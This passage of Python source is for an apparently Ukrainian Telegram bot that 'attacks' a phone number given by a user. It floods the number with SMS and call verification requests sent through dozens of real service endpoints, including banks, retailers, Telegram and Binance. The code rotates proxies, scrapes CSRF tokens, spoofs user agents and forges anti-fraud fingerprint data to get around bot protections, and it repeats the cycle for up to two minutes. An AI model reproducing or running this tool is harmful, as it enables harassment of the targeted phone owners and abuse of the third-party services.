            "🔒 <b>Premium доступ недоступний</b>\n\n"
            "На жаль, у вас немає Premium статусу для використання бота.\n"
            "Для отримання доступу зверніться до адміністратора.",
            parse_mode="HTML"
        )
        return
    
    message_text = '🎯 Готовий до атаки!\n\n💥 Очікую на номер телефону..'
    
    await message.answer(message_text, parse_mode="html", reply_markup=profile_keyboard)

async def send_request(url, data=None, json=None, headers=None, method='POST', cookies=None, proxy=None, proxy_auth=None):
    async with aiohttp.ClientSession(cookies=cookies) as session:
        if method == 'POST':
            async with session.post(url, data=data, json=json, headers=headers, proxy=proxy, proxy_auth=proxy_auth) as response:
                return response
        elif method == 'GET':
            async with session.get(url, headers=headers, proxy=proxy, proxy_auth=proxy_auth) as response:
                return response
        else:
            raise ValueError(f"Unsupported method {method}")

async def ukr(number, chat_id, proxy_url=None, proxy_auth=None, proxy_entry=None):
    headers = {"User-Agent": fake_useragent.UserAgent().random}

    csrf_url = "https://auto.ria.com/iframe-ria-login/registration/2/4"
    try:
        csrf_token = await get_csrf_token(csrf_url, headers=headers)
    except ValueError as e:
        logging.error(f"Не вдалося отримати CSRF-токен: {e}")
        return

    logging.info(f"Отримано CSRF-токен: {csrf_token}")

    # Отримуємо CSRF токен для finbert
    finbert_csrf_url = "https://finbert.ua/auth/register/"
    finbert_csrf_token = None
    try:
        # Створюємо сесію для отримання CSRF токена з cookies
        async with aiohttp.ClientSession() as session:
            async with session.get(finbert_csrf_url, headers=headers_finbert, cookies=cookies_finbert, proxy=proxy_url, proxy_auth=proxy_auth) as response:
                html = await response.text()
                soup = BeautifulSoup(html, "html.parser")
                csrf_input = soup.find("input", {"name": "csrfmiddlewaretoken"})
                if csrf_input:
                    finbert_csrf_token = csrf_input.get("value")
                    logging.info(f"Отримано CSRF-токен для finbert: {finbert_csrf_token}")
                else:
                    raise ValueError("CSRF-токен для finbert не знайдено")
    except Exception as e:
        logging.warning(f"Не вдалося отримати CSRF-токен для finbert: {e}")

    # Отримуємо sessid для brabrabra
    brabrabra_sessid = None
    brabrabra_url = "https://brabrabra.ua/auth/modal.php?login=yes&ajax_mode=Y"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(brabrabra_url, headers=headers_brabrabra, cookies=cookies_brabrabra, proxy=proxy_url, proxy_auth=proxy_auth) as response:
                html = await response.text()
                soup = BeautifulSoup(html, "html.parser")
                sessid_input = soup.find("input", {"name": "sessid"})
                if sessid_input:
                    brabrabra_sessid = sessid_input.get("value")
                    logging.info(f"Отримано sessid для brabrabra: {brabrabra_sessid}")
                else:
                    # Якщо не знайдено в формі, використовуємо з cookies
                    brabrabra_sessid = cookies_brabrabra.get("PHPSESSID", "")
                    logging.info(f"Використовую PHPSESSID з cookies: {brabrabra_sessid}")
    except Exception as e:
        logging.warning(f"Не вдалося отримати sessid для brabrabra: {e}")
        # Використовуємо з cookies як fallback
        brabrabra_sessid = cookies_brabrabra.get("PHPSESSID", "")

    # Отримуємо CSRF токен та cookies для megogo
    megogo_csrf_token = None
    megogo_cookies = None
    try:
        megogo_auth_url = "https://megogo.net/ua/auth_login"
        async with aiohttp.ClientSession() as session:
            async with session.get(megogo_auth_url, headers=headers, proxy=proxy_url, proxy_auth=proxy_auth) as response:
                # Отримуємо cookies з відповіді (конвертуємо SimpleCookie в словник)
                megogo_cookies = {key: morsel.value for key, morsel in response.cookies.items()}
                # Спробуємо отримати CSRF токен з cookies (PLAY_SESSION містить csrfToken)
                play_session = megogo_cookies.get("PLAY_SESSION", "")
                if play_session:
                    try:
                        # PLAY_SESSION це JWT токен, який містить csrfToken в payload
                        # Розділяємо JWT на частини
                        play_session_str = str(play_session)
                        parts = play_session_str.split(".")
                        if len(parts) >= 2:
                            # Декодуємо payload (друга частина)
                            payload = parts[1]
                            # Додаємо padding якщо потрібно
                            padding = 4 - len(payload) % 4
                            if padding != 4:
                                payload += "=" * padding
                            decoded_bytes = base64.urlsafe_b64decode(payload)
                            decoded_str = decoded_bytes.decode('utf-8')
                            # Спробуємо розпарсити як JSON
                            try:
                                data = json.loads(decoded_str)
                                if "data" in data and "csrfToken" in data["data"]:
                                    megogo_csrf_token = data["data"]["csrfToken"]
                                    logging.info(f"Отримано CSRF-токен для megogo: {megogo_csrf_token[:20]}...")
                            except (json.JSONDecodeError, ValueError):
                                # Якщо не JSON, спробуємо знайти csrfToken в рядку
                                if "csrfToken" in decoded_str:
                                    match = re.search(r'"csrfToken"\s*:\s*"([^"]+)"', decoded_str)
                                    if match:
                                        megogo_csrf_token = match.group(1)
                                        logging.info(f"Отримано CSRF-токен для megogo (regex): {megogo_csrf_token[:20]}...")
                    except Exception as e:
                        logging.warning(f"Не вдалося розпарсити PLAY_SESSION для megogo: {e}")
                # Якщо не вдалося отримати з cookies, спробуємо з HTML
                if not megogo_csrf_token:
                    html = await response.text()
                    soup = BeautifulSoup(html, "html.parser")
                    # Шукаємо CSRF токен в meta тегах або input полях
                    csrf_meta = soup.find("meta", {"name": "csrf-token"})
                    if csrf_meta:
                        megogo_csrf_token = csrf_meta.get("content")
                    else:
                        csrf_input = soup.find("input", {"name": "csrfToken"})
                        if csrf_input:
                            megogo_csrf_token = csrf_input.get("value")
    except Exception as e:
        logging.warning(f"Не вдалося отримати CSRF-токен для megogo: {e}")

    # Генеруємо динамічні параметри для TrafficGuard
    trafficguard_sid = str(uuid.uuid4())
    trafficguard_psi = str(uuid.uuid4())
    trafficguard_pc = str(uuid.uuid4())
    trafficguard_ciid = str(uuid.uuid4())
    trafficguard_timestamp = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
    trafficguard_timestamp_u = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
    
    # Отримуємо fingerprinting дані (якщо можливо)
    fingerprint_data = await get_trafficguard_fingerprint(proxy_url=proxy_url, proxy_auth=proxy_auth)
    
    # Генеруємо динамічні base64 encoded дані
    current_timestamp = int(datetime.utcnow().timestamp() * 1000)
    
    # Генеруємо lksd (last known session data)
    lksd_data = {
        "s": trafficguard_sid,
        "st": current_timestamp,
        "sod": "duckduckgo.com",
        "sodt": current_timestamp,
        "sods": "r",
        "sodst": current_timestamp
    }
    trafficguard_lksd = base64.b64encode(json.dumps(lksd_data).encode()).decode()
    
    # Генеруємо cd (cookie data) - Google Analytics cookies
    ga_client_id = f"GA1.3.{random.randint(1000000000, 9999999999)}.{current_timestamp // 1000}"
    gid_client_id = f"GA1.3.{random.randint(1000000000, 9999999999)}.{current_timestamp // 1000}"
    ga4_client_id = f"GS2.3.s{current_timestamp}$o1$g1$t{current_timestamp}$j{random.randint(10, 99)}$l0$h0"
    cd_data = {
        "_ga": ga_client_id,
        "_gid": gid_client_id,
        "_ga_3X15VBC9L9": ga4_client_id
    }
    trafficguard_cd = base64.b64encode(json.dumps(cd_data).encode()).decode()
    
    # Генеруємо lpd (landing page data)
    lpd_data = {
        "landing_page_url": "https://rozetka.com.ua/",
        "landing_page_title": "Інтернет-магазин ROZETKA™: офіційний сайт онлайн-гіпермаркету Розетка в Україні",
        "landing_page_referrer": "https://duckduckgo.com"
    }
    trafficguard_lpd = base64.b64encode(json.dumps(lpd_data).encode()).decode()
    
    # Генеруємо device-info з fingerprinting або базовими значеннями
    if fingerprint_data:
        device_info_dict = fingerprint_data
    else:
        device_info_dict = {
            "screen_resolution": "800,1800",
            "available_screen_resolution": "800,1800",
            "system_version": "Windows 10",
            "brand_model": "unknown",
            "system_lang": "uk-UA",
            "timezone": "GMT+00:00",
            "timezoneOffset": 0,
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0",
            "list_plugin": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF",
            "canvas_code": "9f305daa",
            "webgl_vendor": "Mozilla",
            "webgl_renderer": "Mozilla",
            "audio": "35.749972093850374",
            "platform": "Win32",
            "web_timezone": "Atlantic/Reykjavik",
            "device_name": "unknown",
            "fingerprint": "3d2021de20e83ad5eb7bd8637a2051ee",
            "device_id": "",
            "related_device_ids": ""
        }
    trafficguard_device_info = base64.b64encode(json.dumps(device_info_dict).encode()).decode()
    
    # Генеруємо динамічний browser fingerprint (bf) - хеш від ключових параметрів
    bf_string = f"{device_info_dict.get('user_agent', '')}{device_info_dict.get('screen_resolution', '')}{device_info_dict.get('canvas_code', '')}{device_info_dict.get('audio', '')}"
    trafficguard_bf = hashlib.md5(bf_string.encode()).hexdigest()

    formatted_number = f"+{number[:2]} {number[2:5]} {number[5:8]} {number[8:10]} {number[10:]}"
    formatted_number2 = f"+{number[:2]}+({number[2:5]})+{number[5:8]}+{number[8:10]}+{number[10:]}"
    formatted_number3 = f"+{number[:2]}+({number[2:5]})+{number[5:8]}+{number[8:]}"
    formatted_number4 = f"+{number[:2]}({number[2:5]}){number[5:8]}-{number[8:10]}-{number[10:]}"
    formatted_number5 = f"+{number[:3]}({number[3:6]}){number[6:9]}-{number[9:11]}-{number[11:]}"
    formatted_number6 = f"+{number[:3]}({number[3:5]}){number[5:8]}-{number[8:10]}-{number[10:]}"
    formatted_number7 = f"+{number[:3]}({number[3:6]}) {number[6:9]}-{number[9:11]}-{number[11:]}"
    formatted_number9 = f"+{number[:2]} ({number[2:5]}) {number[5:8]}-{number[8:10]}-{number[10:]}"
    raw_phone = f"({number[3:6]})+{number[6:9]}+{number[9:]}"
    formatted_number_la = formatted_number9  # Використовуємо той самий формат

    logging.info(f"Запуск атаки на номер {number}")

    async def send_request_and_log(url, **kwargs):
        method = kwargs.get('method', 'POST')
        start_time = asyncio.get_event_loop().time()
        request_success = False
        
        try:
            if not attack_flags.get(chat_id):
                return
            
            timeout = aiohttp.ClientTimeout(total=5)
            domain = url.split('/')[2] if '/' in url else url
            
            async with aiohttp.ClientSession(timeout=timeout) as session:
                method = kwargs.pop('method', 'POST')
                # sanitize encodings to avoid brotli dependency
                hdrs = kwargs.get('headers') or {}
                try:
                    hdrs['Accept-Encoding'] = 'gzip, deflate'
                except Exception:
                    pass
                kwargs['headers'] = hdrs
                
                async with session.request(method, url, **kwargs) as response:
                    elapsed_time = asyncio.get_event_loop().time() - start_time
                    request_success = response.status in [200, 201, 202]
                    # Завжди виводимо статус в цифрах, навіть якщо це помилка
                    logging.info(f"{domain} | {response.status} | {elapsed_time:.2f}s")
                        
        except asyncio.TimeoutError:
            request_success = False
            elapsed_time = asyncio.get_event_loop().time() - start_time
            domain = url.split('/')[2] if '/' in url else url
            logging.info(f"{domain} | TIMEOUT | {elapsed_time:.2f}s")
            
        except aiohttp.ClientResponseError as e:
            request_success = False
            elapsed_time = asyncio.get_event_loop().time() - start_time
            domain = url.split('/')[2] if '/' in url else url
            logging.info(f"{domain} | {e.status} | {elapsed_time:.2f}s")
            
        except aiohttp.ClientError as e:
            request_success = False
            elapsed_time = asyncio.get_event_loop().time() - start_time
            domain = url.split('/')[2] if '/' in url else url
            # Спробуємо отримати статус з помилки
            status_code = getattr(e, 'status', None) or getattr(e, 'code', None) or getattr(e, 'status_code', None)
            if status_code:
                logging.info(f"{domain} | {status_code} | {elapsed_time:.2f}s")
            else:
                logging.info(f"{domain} | ERROR | {elapsed_time:.2f}s")
            
        except Exception as e:
            request_success = False
            elapsed_time = asyncio.get_event_loop().time() - start_time
            domain = url.split('/')[2] if '/' in url else url
            # Спробуємо отримати статус з помилки з різних місць
            status_code = (getattr(e, 'status', None) or 
                          getattr(e, 'code', None) or 
                          getattr(e, 'status_code', None) or
                          (e.args[0] if isinstance(e.args[0], int) and 100 <= e.args[0] <= 599 else None))
            if status_code:
                logging.info(f"{domain} | {status_code} | {elapsed_time:.2f}s")
            else:
                logging.info(f"{domain} | ERROR | {elapsed_time:.2f}s")
        
        finally:
            # Відстежуємо стабільність проксі на основі реальних результатів
            if proxy_entry:
                global proxies_success, proxies_failed
                key = proxy_key(proxy_entry)
                if request_success:
                    proxies_success[key] = proxies_success.get(key, 0) + 1
                else:
                    proxies_failed[key] = proxies_failed.get(key, 0) + 1

    semaphore = asyncio.Semaphore(3)  # Зменшено до 3 одночасних запитів

    async def bounded_request(url, **kwargs):
        if not attack_flags.get(chat_id):
            return
        async with semaphore:
            await send_request_and_log(url, **kwargs)
            await asyncio.sleep(1.0)  # Затримка 1 секунда між запитами

    # Helper: attach fixed proxy for this iteration
    def with_proxy(kwargs):
        if proxy_url:
            kwargs.update({"proxy": proxy_url, "proxy_auth": proxy_auth})
        return kwargs

    # Функція для створення масиву запитів (щоб можна було викликати двічі)
    def create_requests():
        # Генеруємо device_id та fingerprint для monto (однакові для одного виклику)
        monto_device_id = str(uuid.uuid4())
        monto_fingerprint = monto_device_id  # Вони однакові в прикладі
        
        # Генеруємо protectCode та sign для EVA
        eva_protect_code = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        # Генеруємо sign як MD5 хеш від phone + protectCode
        eva_sign_string = number + eva_protect_code
        eva_sign = hashlib.md5(eva_sign_string.encode()).hexdigest()
        
        return [
            bounded_request("https://my.telegram.org/auth/send_password", **with_proxy({"data": {"phone": "+" + number}, "headers": headers})),
            bounded_request("https://helsi.me/api/healthy/v2/accounts/login", **with_proxy({"json": {"phone": number, "platform": "PISWeb"}, "headers": headers})),
            bounded_request("https://helsi.me/api/healthy/v2/accounts/call", **with_proxy({"json": {"phone": number, "platform": "PISWeb"}, "headers": headers})),
            bounded_request("https://auth.multiplex.ua/login", **with_proxy({"json": {"login": "+" + number}, "headers": headers})),
            bounded_request("https://api.pizzaday.ua/api/V1/user/sendCode", **with_proxy({"json": {"applicationSend": "sms", "lang": "uk", "phone": number}, "headers": headers})),
            bounded_request("https://stationpizza.com.ua/api/v1/auth/phone-auth", **with_proxy({"json": {"needSubscribeForNews": "false", "phone": formatted_number}, "headers": headers})),
            bounded_request("https://core.takeuseat.in.ua/auth/user/requestSMSVerification", **with_proxy({"json": {"phone": "+" + number}, "headers": headers})),
            bounded_request("https://aurum.in.ua/local/ajax/authorize.php?lang=ua", **with_proxy({"json": {"phone": formatted_number, "type": ""}, "headers": headers})),
            bounded_request("https://pizza-time.eatery.club/site/v1/pre-login", **with_proxy({"json": {"phone": number}, "headers": headers})),
            bounded_request("https://iq-pizza.eatery.club/site/v1/pre-login", **with_proxy({"json": {"phone": number}, "headers": headers})),
            bounded_request("https://dnipro-m.ua/ru/phone-verification/", **with_proxy({"json": {"phone": number}, "headers": headers_dnipro, "cookies": cookies_dnipro})),
            bounded_request("https://my.ctrs.com.ua/api/auth/login", **with_proxy({"json": {"identity": "+" + number}, "headers": headers_citrus, "cookies": cookies_citrus})),
            bounded_request("https://auth.easypay.ua/api/check", **with_proxy({"json": {"phone": number}, "headers": headers_easypay})),
            bounded_request("https://sandalini.ua/ru/signup/", **with_proxy({"data": {"data[firstname]": "деня", "data[phone]": formatted_number2, "wa_json_mode": "1", "need_redirects  ": "1", "contact_type": "person"}, "headers": headers})),
            bounded_request("https://uvape.pro/index.php?route=account/register/add", **with_proxy({"data": {"firstname": "деня", "telephone": formatted_number3, "email": "random@gmail.com", "password": "VHHsq6b#v.q>]Fk"}, "headers": headers_uvape, "cookies": cookies_uvape})),
            bounded_request("https://vandalvape.life/index.php?route=extension/module/sms_reg/SmsCheck", **with_proxy({"data": {"phone": formatted_number4, "only_sms": "1"}, "headers": headers})),
            bounded_request("https://terra-vape.com.ua/index.php?route=common/modal_register/register_validate", **with_proxy({"data": {"firstname": "деня", "lastname": "деневич", "email": "randi@gmail.com", "telephone": number, "password": "password24-", "smscode": "", "step": "first_step"}, "headers": headers_terravape, "cookies": cookies_terravape})),
            bounded_request("https://im.comfy.ua/api/auth/v3/otp/send", **with_proxy({"json": {"phone": number}, "headers": headers})),
            bounded_request("https://www.moyo.ua/identity/registration", **with_proxy({"data": {"firstname": "деня", "phone": formatted_number5, "email": "rando@gmail.com"}, "headers": headers_moyo, "cookies": cookies_moyo})),
            bounded_request("https://pizza.od.ua/ajax/reg.php", **with_proxy({"data": {"phone": formatted_number4}, "headers": headers})),
            bounded_request("https://sushiya.ua/ru/api/v1/user/auth", **with_proxy({"data": {"phone": number[2:], "need_skeep": ""}, "headers": headers_sushiya})),
            bounded_request("https://avrora.ua/index.php?dispatch=otp.send", **with_proxy({"data": {"phone": formatted_number6, "security_hash": "0dc890802de67228597af47d95a7f52b", "is_ajax": "1"}, "headers": headers})),
            bounded_request("https://zolotakraina.ua/ua/turbosms/verification/code", **with_proxy({"data": {"telephone": number, "email": "rando@gmail.com", "form_key": "PKRxVkPlQqBlb8Wi"}, "headers": headers_zolota, "cookies": cookies_zolota})),
            bounded_request("https://auto.ria.com/iframe-ria-login/registration/2/4", **with_proxy({"data": {"_csrf": csrf_token, "RegistrationForm[email]": f"{number}", "RegistrationForm[name]": "деня", "RegistrationForm[second_name]": "деневич", "RegistrationForm[agree]": "1", "RegistrationForm[need_sms]": "1"}, "headers": headers_avtoria, "cookies": cookies_avtoria})),
            bounded_request(f"https://ukrpas.ua/login?phone=+{number}", **with_proxy({"method": 'GET', "headers": headers})),
            bounded_request("https://maslotom.com/api/index.php?route=api/account/phoneLogin", **with_proxy({"data": {"phone": formatted_number6}, "headers": headers})),
            bounded_request("https://varus.ua/api/ext/uas/auth/send-otp?storeCode=ua", **with_proxy({"json": {"phone": "+" + number}, "headers": headers})),
            bounded_request("https://getvape.com.ua/index.php?route=extension/module/regsms/sendcode", **with_proxy({"data": {"telephone": formatted_number7}, "headers": headers})),
            bounded_request("https://api.iqos.com.ua/v1/auth/otp", **with_proxy({"json": {"phone": number}, "headers": headers})),
            bounded_request(f"https://llty-api.lvivkholod.com/api/client/{number}", **with_proxy({"method": 'POST', "headers": headers})),
            bounded_request("https://api-mobile.planetakino.ua/graphql", **with_proxy({"json": {"query": "mutation customerVerifyByPhone($phone: String!) { customerVerifyByPhone(phone: $phone) { isRegistered }}", "variables": {"phone": "+" + number}}, "headers": headers})),
            bounded_request("https://back.trofim.com.ua/api/via-phone-number", **with_proxy({"json": {"phone": number}, "headers": headers})),
            bounded_request("https://dracula.robota.ua/?q=SendOtpCode", **with_proxy({"json": {"operationName": "SendOtpCode", "query": "mutation SendOtpCode($phone: String!) {  users {    login {      otpLogin {        sendConfirmation(phone: $phone) {          status          remainingAttempts          __typename        }        __typename      }      __typename    }    __typename  }}", "variables": {"phone": number}}, "headers": headers})),
            bounded_request(f"https://shop.kyivstar.ua/api/v2/otp_login/send/{number[2:]}", **with_proxy({"method": 'GET', "headers": headers})),
            bounded_request("https://elmir.ua/response/load_json.php?type=validate_phone", **with_proxy({"data": {"fields[phone]": "+" + number, "fields[call_from]": "register", "fields[sms_code]": "", "action": "code"}, "headers": headers_elmir, "cookies": cookies_elmir})),
            bounded_request(f"https://bars.itbi.com.ua/smart-cards-api/common/users/otp?lang=uk&phone={number}", **with_proxy({"method": 'GET', "headers": headers})),
            bounded_request("https://api.kolomarket.abmloyalty.app/v2.1/client/registration", **with_proxy({"json": {"phone": number, "password": "!EsRP2S-$s?DjT@", "token": "null"}, "headers": headers})),
            bounded_request("https://ucb.z.apteka24.ua/api/send/otp", **with_proxy({"json": {"phone": number}, "headers": headers_apteka24})),
            bounded_request("https://api.ta-da.net.ua/v1.1/mobile/user.auth", **with_proxy({"json": {"phone": formatted_number9}, "headers": headers_ta_da})),
            bounded_request("https://mobilebanking.monto.com.ua/api-web/v1/authorization", **with_proxy({"json": {"form_id": "get_login", "login": number}, "headers": {**headers_monto, "device_id": monto_device_id, "fingerprint": monto_fingerprint}, "cookies": cookies_monto})),
            bounded_request("https://smartmedicalcenter.ua/health/", **with_proxy({"data": {"auth_login": number[2:], "auth_password": "1234567890"}, "headers": headers_smartmedical, "cookies": cookies_smartmedical})),
            bounded_request("https://auth.silpo.ua/api/v2/Login/ByPhone?returnUrl=/connect/authorize/callback?client_id=silpo--site--spa&redirect_uri=https%3A%2F%2Fsilpo.ua%2Fsignin-callback-angular.html&response_type=code&scope=public-my%20openid&nonce=62467d1da847556567d91332155e1a20f91fX8X6q&state=7a1776bee43ba28c3ab79191a4e54a4c55ll8naMu&code_challenge=V5cFVVx4xON-EYdzjheeqM2l1K5KUnQ4dDXJ5ROU58Y&code_challenge_method=S256", **with_proxy({"json": {"delivery_method": "sms", "phone": "+" + number, "phoneChannelType": 0, "recaptcha": None}, "headers": headers_silpo})),
            bounded_request("https://goodwine.com.ua/ua/auth/code/send", **with_proxy({"json": {"username": "+" + number}, "headers": headers_goodwine})),
            bounded_request("https://brabrabra.ua/auth/modal.php?login=yes&ajax_mode=Y", **with_proxy({"data": {"sessid": brabrabra_sessid or "", "step": "1", "phone": formatted_number9, "ajax_mode": "Y"}, "headers": headers_brabrabra, "cookies": cookies_brabrabra})),
            bounded_request("https://finbert.ua/auth/register/", **with_proxy({"data": {"csrfmiddlewaretoken": finbert_csrf_token or "", "phone": "+" + number, "cf-turnstile-response": ""}, "headers": headers_finbert, "cookies": cookies_finbert})),
            bounded_request("https://www.work.ua/api/v3/jobseeker/auth/", **with_proxy({"json": {"login": formatted_number}, "headers": headers_workua, "cookies": cookies_workua})),
            bounded_request("https://accounts.binance.com/bapi/accounts/v1/public/account/security/request/precheck", **with_proxy({"json": {"bizType": "login", "callingCode": "380", "mobile": number[3:], "mobileCode": "UA"}, "headers": headers_binance, "cookies": cookies_binance})),
            bounded_request("https://api.trafficguard.ai/tg-g-017014-001/api/v4/client-side/validate/event", **with_proxy({"data": {"pgid": "tg-g-017014-001", "sid": trafficguard_sid, "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0", "hr": "https://duckduckgo.com/", "pd": "{'name':'javascript_tag','version':'2.10.10'}", "psi": trafficguard_psi, "fpj": "true", "pvc": "1", "e": "registration", "et": trafficguard_timestamp, "etu": trafficguard_timestamp_u, "ep": '{"tag":"tg_68e3b20662f40"}', "tag": "tg_68e3b20662f40", "bua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0", "buad": "{}", "bw": "false", "bl": "uk-UA", "bcd": "24", "bdm": "not available", "bpr": "2", "bhc": "4", "bsr": "900,1800", "bto": "0", "bt": "Atlantic/Reykjavik", "bss": "true", "bls": "true", "bid": "true", "bod": "false", "bcc": "not available", "bnp": "Win32", "bdnt": "unspecified", "babk": "false", "bts": "10, false, false", "bf": trafficguard_bf, "s": "duckduckgo.com", "c": "", "p": "", "crt": "", "c2": "", "k": "", "sei": "", "t": "", "ti": "", "usid": "", "s3": "", "a": "", "csid": "", "pidi": "", "s2": "", "a2": "", "a4": "", "a3": "", "g": "", "wh": "rozetka.com.ua", "wp": "/", "wt": "Інтернет-магазин ROZETKA™: офіційний сайт онлайн-гіпермаркету Розетка в Україні", "wu": "https://rozetka.com.ua/", "bipe": "false", "bih": "false", "sis": "", "pci": "", "event_revenue_usd": "", "isc": "", "gid": "", "csi": "javascript_tag", "gc": "", "msclkid": "", "tgclid": "", "tgsid": "", "fbclid": "", "irclid": "", "dcclid": "", "gclsrc": "", "gbraid": "", "wbraid": "", "gac": "", "sipa": "eyJpZCI6ImpzIiwic2MiOiJnZW5lcmF0ZWQifQ==", "sila": "r", "if": "false", "pc": trafficguard_pc, "lksd": trafficguard_lksd, "cd": trafficguard_cd, "cpr": "true", "ciid": trafficguard_ciid, "fuid": "", "fbpxid": "480863978968397", "tid": "", "lpd": trafficguard_lpd, "stpes": "false", "udo": "e30="}, "headers": headers_trafficguard})),
            bounded_request(f"https://c2c.oschadbank.ua/api/sms/{number}", **with_proxy({"method": 'GET', "headers": headers})),
            bounded_request(f"https://api.prosto.net/v2/verify?type=intl_phone&value={number}", **with_proxy({"method": 'GET', "headers": headers})),
            bounded_request("https://la.ua/vinnytsya/wp-admin/admin-ajax.php?lang=uk", **with_proxy({"data": {"action": "user_login", "formData": f"tel={urllib.parse.quote(formatted_number_la, safe='')}&code=", "nonce": "1d8ce3c7e4"}, "headers": headers_la})),
            bounded_request("https://api.ta-da.net.ua/v1.1/mobile/auth.call", **with_proxy({"json": {"phone": formatted_number9}, "headers": headers_ta_da, "method": "PUT"})),
            bounded_request("https://megogo.net/wb/authForm_v3/authPhone?lang=ua", **with_proxy({"data": {"target_url": "/ua", "login": "+" + number, "action": "widget_5", "g-recaptcha-version": "v3", "g-recaptcha-response": ""}, "headers": {**headers, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://megogo.net", "Referer": "https://megogo.net/ua/auth_login", "X-Requested-With": "XMLHttpRequest", "Csrf-Token": megogo_csrf_token or ""}, "cookies": megogo_cookies or {}})),
            bounded_request("https://pwa-api.eva.ua/api/user/send-code?storeCode=ua", **with_proxy({"json": {"phone": number, "protectCode": eva_protect_code, "sign": eva_sign}, "headers": headers_eva})),
        ]

    if not attack_flags.get(chat_id):
        return
    
    # Створюємо і виконуємо всі запити один раз
    requests_batch = create_requests()
    if requests_batch:
        logging.info(f"Запускаю атаку ({len(requests_batch)} запитів)")
        await asyncio.gather(*requests_batch, return_exceptions=True)
        logging.info("Атака завершена")
    else:
        logging.warning("Список запитів порожній!")

async def start_attack(number, chat_id, timeout=120, sleep_between_cycles=4.0):
    global attack_flags
    attack_flags[chat_id] = True
    
    start_time = asyncio.get_event_loop().time()

    try:
        await check_and_update_proxies()
        snapshot = proxies_healthy.copy()
        # choose least-used proxy (then by lower latency) for the whole attack session
        p_url = None
        p_auth = None
        best_entry = None
        if snapshot:
            try:
                # map latency by key
                lat_by_key = {}
                for item in proxies_stats:
                    e = item['entry']
                    lat_by_key[proxy_key(e)] = item.get('latency_ms', 999999)
                # select min by (usage, latency)
                best_entry = min(
                    snapshot,
                    key=lambda e: (proxies_usage.get(proxy_key(e), 0), lat_by_key.get(proxy_key(e), 999999))
                )
                key = proxy_key(best_entry)
                proxies_usage[key] = proxies_usage.get(key, 0) + 1
                p_url, p_auth = build_proxy_params(best_entry)
                logging.info(f"Using proxy for attack: {best_entry['host']}:{best_entry['port']}")
            except Exception:
                p_url, p_auth = None, None
                best_entry = None
        
        while (asyncio.get_event_loop().time() - start_time) < timeout:
            if not attack_flags.get(chat_id):
                logging.info(f"Атаку на номер {number} зупинено користувачем.")
                try:
                    msg_id = last_status_msg.get(chat_id)
                    if msg_id:
                        await bot.edit_message_text("🛑 Атака зупинена користувачем.", chat_id=chat_id, message_id=msg_id)
                except Exception:
                    pass
                return
            
            await ukr(number, chat_id, proxy_url=p_url, proxy_auth=p_auth, proxy_entry=best_entry)
            
            if not attack_flags.get(chat_id):
                logging.info(f"Атаку на номер {number} зупинено користувачем.")
                try:
                    msg_id = last_status_msg.get(chat_id)
                    if msg_id:
                        await bot.edit_message_text("🛑 Атака зупинена користувачем.", chat_id=chat_id, message_id=msg_id)
                except Exception:
                    pass
                return
            await asyncio.sleep(sleep_between_cycles)  # Затримка між циклами (після повного завершення атаки)
            
    except asyncio.CancelledError:
        try:
            msg_id = last_status_msg.get(chat_id)
            if msg_id:
                await bot.edit_message_text("🛑 Атака зупинена.", chat_id=chat_id, message_id=msg_id)
        except Exception:
            pass
    except Exception as e:
        logging.error(f"Помилка при виконанні атаки: {e}")
        await bot.send_message(chat_id, "❌ Сталася помилка при виконанні атаки.")
    finally:
        attack_flags[chat_id] = False
        # Видаляємо активну атаку користувача
        active_attacks.pop(chat_id, None)

    logging.info(f"Атака на номер {number} завершена")
    
    inline_keyboard2 = types.InlineKeyboardMarkup()
    code_sub = types.InlineKeyboardButton(text='🎪 Канал', url='https://t.me/+tod0WSFEpEQ2ODcy')
    inline_keyboard2 = inline_keyboard2.add(code_sub)
    try:
        msg_id = last_status_msg.get(chat_id)
        if msg_id:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg_id,
                text=f"""👍 Атака на номер <i>{number}</i> завершена!
 
Допоможи нам зростати — запроси друга!

💬 Знайшли баг або проблему? Звертайтесь до @Nobysss

""",
                parse_mode="html"
            )
    except Exception:
        pass

@dp.message_handler(lambda message: message.text and not message.text.startswith('/start'), content_types=['text'])
@dp.throttled(anti_flood, rate=3)
async def handle_phone_number(message: Message, state: FSMContext = None):
    # Перевіряємо, що повідомлення з особистого чату
    if message.chat.type != 'private':
        return  # Ігноруємо повідомлення з груп
    
    # Якщо користувач в стані FSM - не обробляємо номер (даємо обробити іншим обробникам)
    # Отримуємо поточний стан через storage
    try:
        # Створюємо контекст для перевірки стану
        check_state = FSMContext(storage=dp.storage, chat=message.chat.id, user=message.from_user.id)
        current_state = await check_state.get_state()
        
        # Якщо користувач в будь-якому стані FSM - не обробляємо як номер телефону
        # Це дозволяє іншим обробникам зі станами обробити повідомлення
        if current_state is not None:
            return  # Користувач в стані FSM, не обробляємо як номер телефону
    except Exception as e:
        # Якщо виникла помилка при перевірці стану, продовжуємо обробку
        logging.debug(f"Помилка перевірки стану FSM: {e}")
    
    # Ігноруємо текст кнопок
    button_texts = ['🆘 Допомога', '🎯 Почати атаку']
    if message.text in button_texts:
        return
    
    user_id = message.from_user.id
    
    if not await user_exists(user_id):
        await message.answer("Для використання бота потрібно натиснути /start")
        return
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow("SELECT block FROM users WHERE user_id = $1", user_id)
    
    if not result:
        await message.answer("Помилка: Не вдалося знайти користувача.")
        return

    if result['block'] == 1:
        await message.answer("Вас заблоковано і ви не можете користуватися ботом.")
        return

    number = message.text.strip()
    chat_id = message.chat.id
    
    # Додаткова перевірка: якщо введено тільки цифри і це не номер телефону (не починається з 380 або 0),
    # або якщо довжина не відповідає номеру телефону (10-12 цифр), то це може бути ID користувача
    cleaned_number = re.sub(r'\D', '', number)
    if cleaned_number.isdigit() and len(cleaned_number) > 0:
